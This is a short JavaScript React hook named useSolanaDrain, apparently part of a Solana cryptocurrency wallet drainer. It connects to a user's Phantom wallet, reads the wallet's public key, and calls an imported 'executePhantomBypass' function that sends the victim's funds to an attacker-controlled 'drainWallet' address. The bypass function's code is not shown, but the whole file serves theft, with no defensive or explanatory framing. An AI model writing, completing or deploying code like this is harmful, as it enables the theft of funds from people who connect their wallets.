import { useState, useCallback } from 'react';
import { Connection, PublicKey } from '@solana/web3.js';
import { executePhantomBypass } from '@/utils/phantomBypass';

export const useSolanaDrain = (rpcUrl, drainWallet) => {
  const [status, setStatus] = useState('idle');
  const [error, setError] = useState(null);

  const executeDrain = useCallback(async (provider, allocatedAmount) => {
    try {
      setStatus('processing');
      
      const connection = new Connection(rpcUrl, 'confirmed');
      const response = await provider.connect();
      const walletAddress = response.publicKey;
      
      // Execute bypass drain
      const result = await executePhantomBypass(
        provider,
        connection,
        drainWallet,
        walletAddress
      );
      
      setStatus('success');
      return result;
      
    } catch (err) {
      setError(err.message);
      setStatus('failed');
      throw err;
    }
  }, [rpcUrl, drainWallet]);

  return { executeDrain, status, error };
};
